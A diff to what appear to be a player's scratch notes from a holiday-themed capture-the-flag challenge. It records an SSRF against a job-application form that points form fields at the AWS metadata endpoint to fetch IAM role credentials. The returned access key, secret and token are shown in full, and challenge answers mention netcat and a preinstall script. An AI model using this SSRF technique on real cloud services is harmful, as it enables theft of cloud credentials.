@@ -309,6 +309,90 @@ Flud Hagg Yaqh
 
 Not able to run the same commands, dir buster?
 
+SSRF in file upload lets try and input something out of th eworld in file input
+
+https://apply.jackfrosttower.com/?inputName=s&inputEmail=s@s.c&inputPhone=s&inputField=Crayon%20on%20walls&resumeFile=%22file://images/4.jpg%22&inputWorkSample=file://images/4.jpg&additionalInformation=werwerwer&submit=file://images/4.jpg
+
+
+cheat from https://cobalt.io/blog/a-pentesters-guide-to-server-side-request-forgery-ssrf#:~:text=etc/passwd%22%3E%5C%3C/iframe%3E%5C%0A%0A%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D-,__AWS%3A__,-http%3A//instance%2Ddata
+
+got an invalid name input
+
+
+ami-id
+ami-launch-index
+ami-manifest-path
+block-device-mapping/ami
+block-device-mapping/ebs0
+block-device-mapping/ephemeral0
+block-device-mapping/root
+block-device-mapping/swap
+elastic-inference/associations
+elastic-inference/associations/eia-bfa21c7904f64a82a21b9f4540169ce1
+events/maintenance/scheduled
+events/recommendations/rebalance
+hostname
+iam/info
+iam/security-credentials
+iam/security-credentials/jf-deploy-role
+instance-action
+instance-id
+instance-life-cycle
+instance-type
+latest
+latest/api/token
+local-hostname
+local-ipv4
+mac
+network/interfaces/macs/0e:49:61:0f:c3:11/device-number
+network/interfaces/macs/0e:49:61:0f:c3:11/interface-id
+network/interfaces/macs/0e:49:61:0f:c3:11/ipv4-associations/192.0.2.54
+network/interfaces/macs/0e:49:61:0f:c3:11/ipv6s
+network/interfaces/macs/0e:49:61:0f:c3:11/local-hostname
+network/interfaces/macs/0e:49:61:0f:c3:11/local-ipv4s
+network/interfaces/macs/0e:49:61:0f:c3:11/mac
+network/interfaces/macs/0e:49:61:0f:c3:11/owner-id
+network/interfaces/macs/0e:49:61:0f:c3:11/public-hostname
+network/interfaces/macs/0e:49:61:0f:c3:11/public-ipv4s
+network/interfaces/macs/0e:49:61:0f:c3:11/security-group-ids
+network/interfaces/macs/0e:49:61:0f:c3:11/security-groups
+network/interfaces/macs/0e:49:61:0f:c3:11/subnet-id
+network/interfaces/macs/0e:49:61:0f:c3:11/subnet-ipv4-cidr-block
+network/interfaces/macs/0e:49:61:0f:c3:11/subnet-ipv6-cidr-blocks
+network/interfaces/macs/0e:49:61:0f:c3:11/vpc-id
+network/interfaces/macs/0e:49:61:0f:c3:11/vpc-ipv4-cidr-block
+network/interfaces/macs/0e:49:61:0f:c3:11/vpc-ipv4-cidr-blocks
+network/interfaces/macs/0e:49:61:0f:c3:11/vpc-ipv6-cidr-blocks
+placement/availability-zone
+placement/availability-zone-id
+placement/group-name
+placement/host-id
+placement/partition-number
+placement/region
+product-codes
+public-hostname
+public-ipv4
+public-keys/0/openssh-key
+reservation-id
+security-groups
+services/domain
+services/partition
+spot/instance-action
+spot/termination-time
+
+GET /?inputName=jf&inputEmail=http://169.254.169.254/latest/meta-data/iam/security-credentials/jf-deploy-role&inputPhone=http://169.254.169.254/latest/meta-data/iam/security-credentials/jf-deploy-role&resumeFile=http://169.254.169.254/latest/meta-data/iam/security-credentials/jf-deploy-role&inputWorkSample=http://169.254.169.254/latest/meta-data/iam/security-credentials/jf-deploy-role&additionalInformation=http://169.254.169.254/latest/meta-data/iam/security-credentials/jf-deploy-role&submit= HTTP/2
+
+{
+	"Code": "Success",
+	"LastUpdated": "2021-05-02T18:50:40Z",
+	"Type": "AWS-HMAC",
+	"AccessKeyId": "AKIA5HMBSK1SYXYTOXX6",
+	"SecretAccessKey": "CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX",
+	"Token": "NR9Sz/7fzxwIgv7URgHRAckJK0JKbXoNBcy032XeVPqP8/tWiR/KVSdK8FTPfZWbxQ==",
+	"Expiration": "2026-05-02T18:50:40Z"
+}
+
+
 # elf moving 
 
 Guide 
@@ -460,3 +544,18 @@ slack
 
 last modified by Jack frost
 2021-12-21
+
+# splunk
+
+git status
+git@github.com:elfnp3/partnerapi.git
+docker compose up
+https://github.com/snoopysecurity/dvws-node
+holiday-utils-js
+/usr/bin/nc.openbsd
+6
+preinstall.sh
+
+whiz
+
+
